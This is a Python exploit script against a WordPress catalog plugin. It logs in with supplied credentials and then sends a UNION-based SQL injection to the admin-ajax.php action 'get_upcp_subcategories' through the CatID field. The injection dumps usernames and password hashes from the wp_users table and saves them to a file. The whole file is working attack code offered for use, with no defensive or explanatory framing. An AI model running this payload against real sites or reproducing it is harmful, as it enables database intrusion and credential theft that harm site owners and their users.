import LoginManager
import requests
import re
import RequestForger
import csv

def attack(url):
    performLogin(url)
    response = sqlInjection(url,LoginManager.session)
    if (checkResponseValidity(response)):
        pairList = formatResponseLoginData(response)
        saveDataToFile(pairList)
    else:
        print("Unvalid request, the server gave no valid response")


def performLogin(url):
    username = input("\nInsert your username")
    password = input("Insert your password")
    result = LoginManager.login(url,username,password)
    while (not result):
        print("\nYour login failed, Username or password are wrong, insert them again")
        username = input("Insert your username")
        password = input("Insert your password")
        result = LoginManager.login(url, username, password)


def sqlInjection(url,session):
    url = url + "/wp-admin/admin-ajax.php?action=get_upcp_subcategories"
    headers = {'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost'}
    data = {"CatID": "0 UNION SELECT user_login,user_pass FROM wp_users WHERE ID>=1"}
    response = session.post(url, headers=headers, data=data)
    RequestForger.pretty_print_POST(response.request)
    return response


def checkResponseValidity(response):
    if (response.status_code == 200):
        return True
    else:
        print("Response error code " , response.status_code)
        return False

def formatResponseLoginData(response):
    data = response.text.split(",")
    pairs = []
    while (data):
        pairs.append((data.pop(0),data.pop(0)))
    print ("\nLogin data found : ",pairs)
    return pairs

def saveDataToFile(pairList):
    file = input("Insert the path to the file where you want to save the login data")
    with open( file, "w") as the_file:
        csv.register_dialect("custom", delimiter=":", skipinitialspace=False)
        writer = csv.writer(the_file, dialect="custom")
        for tup in pairList:
            writer.writerow(tup)

    print("\nData saved to file : "+file)


